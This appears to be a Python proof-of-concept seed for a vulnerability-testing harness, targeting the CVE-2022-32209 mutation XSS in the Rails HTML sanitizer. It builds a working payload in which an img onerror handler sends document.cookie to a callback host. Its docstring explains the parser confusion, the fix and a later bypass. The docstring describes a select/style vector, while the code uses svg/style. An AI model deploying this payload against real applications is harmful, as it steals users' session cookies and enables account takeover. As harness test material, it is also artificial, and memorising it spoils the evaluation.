#!/usr/bin/env python3
"""[GIVEN] CVE-2022-32209 seed -- the `<select><style>` parser-context-confusion mutation XSS in
Rails::Html::SafeListSanitizer, exercised via the PER-CALL `:tags` option.

Vector: with BOTH `select` and `style` in the allowlist, the payload
`<select><style><img src=x onerror=...></style></select>`. Nokogiri's HTML4 parser (libxml2)
treats the content of `<style>` as CDATA that needs no escaping, so it serializes the inner
`<img ...>` RAW into the output. A browser (HTML5) instead repairs the tree -- the `<img>` inside
`<select>/<style>` is pulled OUT of the CDATA/foreign context into normal element context, becoming
a LIVE `<img src=x onerror=...>` that fires on load -> reads document.cookie -> exfiltrates the flag
to the internal callback. That is the mutation.

On V1 (rails-html-sanitizer 1.4.3, the CVE-2022-32209 fix = TARGET) the per-call `:tags` path runs
`remove_safelist_tag_combinations`, which deletes `style` from the safelist whenever both `select`
and `style` are present. With `style` disallowed the `<style>` wrapper is stripped/escaped, the
mutation cannot occur, the output is inert -> BLOCKED (no flag).

The gap CVE-2022-23520 later bypasses: that 1.4.3 scrub is only wired into the `options[:tags]`
branch, so the CLASS-LEVEL allowed_tags override is NOT run through it.
"""
import json
import sys

# Internal compose callback the exfil payload navigates to (not a host port).
CB = "//callback:9000/c?f="

# Foreign-content (<svg>) + <style> wrapper: inside SVG the browser pulls the <img> out of
# <style> CDATA into normal element context so onerror fires. The 1.4.3 select+style safelist
# scrub is armed by the allowlist containing BOTH `select` and `style`.
CDATA_STYLE_PAYLOAD = (
    "<svg><style>"
    "<img src=x onerror=\"document.location='" + CB + "'+document.cookie\">"
    "</style></svg>"
)


def candidate() -> dict:
    """JSON candidate for seed_exec: per-call :tags path (CVE-2022-32209)."""
    return {
        "probe_id": "cve-2022-32209-select-style-tags",
        "payload": CDATA_STYLE_PAYLOAD,
        "san_mode": "tags",
        "mode": "load",
    }


if __name__ == "__main__":
    _ = sys.argv  # original_poc.py [version] — version is unused; seed_exec gets it separately
    print(json.dumps(candidate()))
